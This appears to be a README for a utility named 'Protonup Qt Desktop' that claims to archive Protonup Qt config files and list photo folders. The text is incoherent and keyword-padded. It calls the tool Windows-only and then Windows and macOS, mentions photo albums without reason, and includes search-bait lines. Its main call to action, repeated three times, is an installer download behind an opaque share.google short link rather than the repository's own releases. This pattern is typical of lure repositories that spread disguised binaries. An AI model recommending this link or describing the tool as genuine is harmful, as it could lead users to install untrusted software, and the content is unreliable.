![Protonup Qt Desktop](assets/hero.png)

# Protonup Qt Desktop

*Keep the Protonup Qt data folder tidy before an update.*

## What Protonup Qt Desktop is

**Protonup Qt Desktop** is a Windows utility. A local helper for Protonup Qt data folders, config and export files, and photo albums on Windows and macOS.

Protonup Qt drops data files next to launcher caches.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Finds the Protonup Qt data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Background

People search Protonup Qt desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/pamelaburns119/protonup-qt-desktop

MIT license. See `LICENSE`.
